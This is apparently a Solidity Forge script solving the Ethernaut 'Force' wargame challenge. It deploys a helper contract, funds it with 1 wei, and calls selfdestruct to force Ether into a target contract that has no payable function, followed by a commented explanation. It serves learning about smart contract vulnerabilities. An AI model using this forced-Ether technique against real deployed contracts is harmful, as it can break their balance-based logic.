// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";

// Contract to perform the attack to force Ether into the vulnerable Force contract
contract ForceEtherSender {
    
    // Function to forcefully send Ether by using the selfdestruct mechanism
    function executeAttack() public {
        // The selfdestruct function sends all the contract's balance to the specified address
        selfdestruct(payable(0xYourInstanceAddressHere));  // Replace with the actual instance address
    }

    // Fallback function to allow this contract to receive Ether
    receive() external payable {}
}

// Forge script to automate the attack by deploying the ForceEtherSender contract and executing the attack
contract ForceAttackScript is Script {
    
    // Instance of the ForceEtherSender contract
    ForceEtherSender forceSenderInstance;

    // Function to execute the attack script
    function run() external {
        // Start broadcasting the transaction using the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the ForceEtherSender contract
        forceSenderInstance = new ForceEtherSender();

        // Send 1 wei of Ether to the ForceEtherSender contract to fund it
        address(forceSenderInstance).call{value: 1 wei}("");

        // Execute the selfdestruct attack to force Ether into the target contract
        forceSenderInstance.executeAttack();

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}

/* 
Explanation:

### Purpose:
This solution automates the attack for the **Force** challenge on Ethernaut, where the goal is to send Ether to a contract that does not explicitly accept Ether. The script exploits the `selfdestruct` function to force Ether into the vulnerable contract.

### Vulnerability:
- The target contract cannot receive Ether via regular means (such as `payable` functions), but Ether can still be forcibly sent to it using the `selfdestruct` function. When `selfdestruct` is called, the contract's balance is forcibly transferred to any specified address.

### How the Script Works:

1. **Deploy the Attack Contract**: 
   - The `ForceEtherSender` contract is deployed. This contract has a fallback `receive()` function, allowing it to accept Ether, and the critical `executeAttack()` function, which calls `selfdestruct`.
   
2. **Send Ether to Attack Contract**: 
   - After deployment, the attack script sends 1 wei of Ether to the `ForceEtherSender` contract to fund it. This Ether will later be sent to the target contract during the `selfdestruct` call.

3. **Force Ether into the Target Contract**: 
   - The script then calls `executeAttack()` on the `ForceEtherSender` contract. This function triggers `selfdestruct`, which forces the contract's balance to be sent to the target contract's address, even though the target contract doesn’t have any Ether-receiving functions.

### Conclusion:
This attack demonstrates that contracts can receive Ether even if they don’t explicitly allow for it by using functions like `payable`. The `selfdestruct` function bypasses this restriction by directly transferring the balance from one contract to another.
*/